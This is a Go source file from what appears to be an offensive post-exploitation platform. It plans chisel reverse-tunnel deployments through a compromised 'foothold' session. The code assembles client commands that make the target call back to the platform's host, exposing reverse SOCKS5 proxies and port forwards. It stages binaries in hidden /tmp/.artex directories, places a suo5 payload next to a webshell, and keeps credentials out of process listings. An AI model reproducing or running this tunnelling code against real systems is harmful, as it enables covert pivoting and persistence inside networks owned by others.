// plan.go 生成隧道部署计划（四件套之 plan)。计划即持久化单元：Plan 整体序列化进
// tunnels.deploy_params，断链重拉反序列化后可直接重新 Deploy，不丢任何参数。
//
// auth 取舍：auth token crypto/rand 16 字节，只存 deploy_params 与平台侧
// --authfile(0600)，不出现在平台 server 进程命令行（ps 不可见）。目标侧 client
// 经 AUTH 环境变量传入（chisel client 在 --auth 缺省时读 AUTH env，见
// https://github.com/jpillora/chisel README),ps cmdline 不可见；残留暴露面是
// 目标机 /proc/<pid>/environ 对同 uid 可读——目标已是立足点，可接受，注释在此。
package tunnel

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"strconv"
)

// Plan 是完整部署计划 = deploy_params 持久化内容。所有进程台账（server_pid/
// remote_pid/stage_token/远端路径）也回写进来，满足受管资源原则。
type Plan struct {
	Kind         string   `json:"kind"`                 // socks | portfwd
	Adapter      string   `json:"adapter"`              // chisel
	TaskID       int64    `json:"task_id"`              // 归属任务
	ViaSessionID int64    `json:"via_session_id"`       // 经哪个立足点部署
	ListenHost   string   `json:"listen_host"`          // 平台侧 server 绑定地址
	ListenPort   int      `json:"listen_port"`          // 平台侧 server 端口（目标回连口）
	SocksPort    int      `json:"socks_port,omitempty"` // socks：平台回环上的 socks5 入口
	LocalPort    int      `json:"local_port,omitempty"` // portfwd：平台回环上的转发入口
	TargetHost   string   `json:"target_host,omitempty"`
	TargetPort   int      `json:"target_port,omitempty"`
	PlatformAddr string   `json:"platform_addr"` // 目标回连地址 host:port(callback host + listen port)
	AuthUser     string   `json:"auth_user"`
	AuthPass     string   `json:"auth_pass"`   // crypto/rand 16 字节 hex；只在此处与 authfile，不进命令行
	AuthFile     string   `json:"auth_file"`   // 平台侧 --authfile 路径（0600)
	ServerArgs   []string `json:"server_args"` // chisel server 参数（不含 auth)
	ServerPID    int      `json:"server_pid,omitempty"`
	ServerLog    string   `json:"server_log"`
	RemoteDir    string   `json:"remote_dir"` // 目标侧 /tmp/.artex-<rand>
	RemoteBin    string   `json:"remote_bin"`
	RemoteLog    string   `json:"remote_log"`
	RemotePID    int      `json:"remote_pid,omitempty"`
	StageToken   string   `json:"stage_token,omitempty"` // 一次性投递条目（用完删）
	VerifyAddr   string   `json:"verify_addr,omitempty"` // 决定性验证目标 host:port
	ClientArgs   []string `json:"client_args"`           // chisel client 参数（不含 auth,auth 走 AUTH env)
	// suo5 适配器字段（omitempty，向后兼容既有 chisel deploy_params):
	PayloadFile string `json:"payload_file,omitempty"` // 平台侧 payloads 目录里的文件名（suo5.php 等）
	PayloadName string `json:"payload_name,omitempty"` // 目标侧随机文件名
	PayloadPath string `json:"payload_path,omitempty"` // 目标侧完整落盘路径（webshell 同目录）
	PayloadURL  string `json:"payload_url,omitempty"`  // suo5 -t 的目标 URL
}

// PlanOpts 是计划生成输入。端口分配所需的占用集合与绑定检查由调用方注入，
// 保持本包组装逻辑纯函数可测。
type PlanOpts struct {
	TaskID       int64
	ViaSessionID int64
	ListenHost   string // 空 = 0.0.0.0
	CallbackHost string // 目标回连平台用的主机地址（config.CallbackAddr 的 host 部分）
	TargetHost   string // portfwd 必填
	TargetPort   int    // portfwd 必填
	VerifyAddr   string // socks 决定性验证目标（通常立足点 webshell 的 host:port)
	PortMin      int
	PortMax      int
	UsedPorts    map[int]bool        // 已占端口（活隧道台账）
	CanListen    func(port int) bool // 真实可绑检查；nil 跳过
	DataDir      string              // 平台侧隧道工作目录（authfile/日志）
}

// newAuth 生成 auth 凭据：user 固定 "artex",pass 为 crypto/rand 16 字节 hex。
func newAuth() (user, pass string, err error) {
	b := make([]byte, 16)
	if _, err = rand.Read(b); err != nil {
		return "", "", fmt.Errorf("auth token 生成失败: %w", err)
	}
	return "artex", hex.EncodeToString(b), nil
}

// randTag 生成 8 字符随机后缀（远端目录/文件名）。
func randTag() (string, error) {
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

func (o *PlanOpts) base(kind string) (*Plan, error) {
	user, pass, err := newAuth()
	if err != nil {
		return nil, err
	}
	tag, err := randTag()
	if err != nil {
		return nil, err
	}
	listenHost := o.ListenHost
	if listenHost == "" {
		listenHost = "0.0.0.0"
	}
	listenPort, err := AllocatePort(o.PortMin, o.PortMax, o.UsedPorts, o.CanListen)
	if err != nil {
		return nil, err
	}
	if o.UsedPorts == nil {
		o.UsedPorts = map[int]bool{}
	}
	o.UsedPorts[listenPort] = true // 同一计划内再分配不撞车
	dir := o.DataDir               // 平台侧隧道工作目录（Manager.PlanDataDir,authfile/日志落这里）
	return &Plan{
		Kind:         kind,
		Adapter:      AdapterChisel,
		TaskID:       o.TaskID,
		ViaSessionID: o.ViaSessionID,
		ListenHost:   listenHost,
		ListenPort:   listenPort,
		PlatformAddr: net.JoinHostPort(o.CallbackHost, strconv.Itoa(listenPort)),
		AuthUser:     user,
		AuthPass:     pass,
		AuthFile:     dir + "/chisel-" + tag + ".authfile",
		ServerLog:    dir + "/chisel-" + tag + ".server.log",
		RemoteDir:    "/tmp/.artex-" + tag,
		RemoteBin:    "/tmp/.artex-" + tag + "/ch",
		RemoteLog:    "/tmp/.artex-" + tag + "/run.log",
		VerifyAddr:   o.VerifyAddr,
	}, nil
}

// assemble 补齐 server/client 命令行。server 经 --authfile 鉴权（auth 不进 ps);
// client 经 AUTH env 鉴权（spawn 时注入，见 deploy.go),ClientArgs 同样不含 auth。
func (p *Plan) assemble(remoteSpec string) {
	p.ServerArgs = []string{
		"server",
		"--host", p.ListenHost,
		"-p", strconv.Itoa(p.ListenPort),
		"--reverse",
		"--authfile", p.AuthFile,
	}
	p.ClientArgs = []string{
		"client",
		"--keepalive", "10s", // chisel 选项必须先于 server/remote——放后面会被当成 remote 解析
		// (实战教训:报 "Failed to decode remote '--keepalive': Missing ports" 客户端秒退)
		"http://" + p.PlatformAddr,
		remoteSpec,
	}
}

// PlanSocks 生成反向 socks 计划：平台回环 127.0.0.1:SocksPort 是 socks5 入口，
// 返回形式（socks5://127.0.0.1:port）期 3b 的按任务 proxyEnv 可直接消费。
func PlanSocks(o *PlanOpts) (*Plan, error) {
	if o.CallbackHost == "" {
		return nil, fmt.Errorf("callback_host 必填（目标回连平台用；配 ARTEX_CALLBACK_ADDR)")
	}
	p, err := o.base(KindSocks)
	if err != nil {
		return nil, err
	}
	socksPort, err := AllocatePort(o.PortMin, o.PortMax, o.UsedPorts, o.CanListen)
	if err != nil {
		return nil, err
	}
	p.SocksPort = socksPort
	p.assemble("R:127.0.0.1:" + strconv.Itoa(socksPort) + ":socks")
	return p, nil
}

// PlanPortfwd 生成反向单端口转发计划：平台回环 127.0.0.1:LocalPort → 目标侧
// TargetHost:TargetPort。
func PlanPortfwd(o *PlanOpts) (*Plan, error) {
	if o.CallbackHost == "" {
		return nil, fmt.Errorf("callback_host 必填（目标回连平台用；配 ARTEX_CALLBACK_ADDR)")
	}
	if o.TargetHost == "" || o.TargetPort <= 0 {
		return nil, fmt.Errorf("portfwd 需要 target_host 与 target_port")
	}
	p, err := o.base(KindPortfwd)
	if err != nil {
		return nil, err
	}
	localPort, err := AllocatePort(o.PortMin, o.PortMax, o.UsedPorts, o.CanListen)
	if err != nil {
		return nil, err
	}
	p.LocalPort = localPort
	p.TargetHost = o.TargetHost
	p.TargetPort = o.TargetPort
	p.assemble("R:127.0.0.1:" + strconv.Itoa(localPort) + ":" +
		net.JoinHostPort(o.TargetHost, strconv.Itoa(o.TargetPort)))
	return p, nil
}

// AuthfileContent 是 --authfile 文件内容。chisel 的 authfile 是 JSON users 映射
// {"user:pass": ["允许的 remote 地址模式"]}——不是裸 user:pass 文本
// (实战教训:v1.11 服务端对裸文本直接报 Invalid JSON 秒退)。
func (p *Plan) AuthfileContent() string {
	b, _ := json.Marshal(map[string][]string{
		p.AuthUser + ":" + p.AuthPass: {".*"},
	})
	return string(b) + "\n"
}

// RollbackStep 描述一层回滚动作。Deploy 任一层失败，按 RollbackSteps 给出的
// 顺序（从最深的已完成层往回收）逐层回滚，不留孤儿进程/文件/台账。
type RollbackStep struct {
	Layer  string `json:"layer"`  // remote_process/remote_files/server_process/stage_entry/authfile/ledger_row
	Action string `json:"action"` // kill/rm/delete
	Detail string `json:"detail"`
}

// RollbackSteps 返回完整回滚序列（纯函数，顺序即契约：先目标侧后平台侧，
// 台账行永远最后删——它是重拉与审计的唯一依据）。实际执行时按失败深度截断。
func (p *Plan) RollbackSteps() []RollbackStep {
	return []RollbackStep{
		{Layer: "remote_process", Action: "kill", Detail: fmt.Sprintf("经会话 kill 目标侧 pid %d（先 kill -0 并核对 /proc/<pid>/cmdline 含 %s)", p.RemotePID, p.RemoteBin)},
		{Layer: "remote_files", Action: "rm", Detail: "经会话 rm -rf " + p.RemoteDir},
		{Layer: "server_process", Action: "kill", Detail: fmt.Sprintf("杀平台侧 chisel server pid %d（核对命令行含 %s)", p.ServerPID, p.AuthFile)},
		{Layer: "stage_entry", Action: "delete", Detail: "删除 stage 投递条目 token=" + p.StageToken},
		{Layer: "authfile", Action: "rm", Detail: "删除平台侧 authfile " + p.AuthFile},
		{Layer: "ledger_row", Action: "delete", Detail: "删除 tunnels 台账行"},
	}
}
